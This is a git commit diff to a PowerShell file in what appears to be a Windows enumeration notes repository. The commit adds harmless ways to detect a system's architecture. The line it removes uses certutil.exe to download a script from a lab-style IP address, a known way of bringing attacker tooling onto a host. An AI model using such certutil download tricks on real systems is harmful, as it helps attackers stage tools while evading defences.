5d3a0d8076f8447a22514a5d7a4c2851fb0a4419
zomy22 <59493928+zomy22@users.noreply.github.com>
2020-02-29 18:37:17 +0200

    Update find_windows_arc.ps1

--- windows_enumeration/find_windows_arc.ps1
+++ windows_enumeration/find_windows_arc.ps1
@@ -1,4 +1,20 @@
-Windows Enumeration Tips and Trips
+# method 1 - Enviroment Variables
+$env:PROCESSOR_ARCHITECTURE
+[Environment]::Is64BitOperatingSystem
 
-Download files from localhost
-certutil.exe -urlcache -split -f "http://10.10.14.15/winarch.ps1" winarch.ps1
+# method 2 - WMI and CIM classes
+(Get-WmiObject Win32_OperatingSystem).OSArchitecture
+(Get-CimInStance CIM_OperatingSystem).OSArchitecture
+(Get-WmiObject Win32_Processor).AddressWidth
+
+# method 3 - Native CMD commands
+(wmic os get osarchitecture)[2]
+
+# method 4 - System.IntPtr type
+[System.IntPtr]::Size # an integer whose size is platform-specific.
+if([System.IntPtr]::Size -eq 4){
+    "32-bit"
+}
+else{
+    "64-bit"
+}
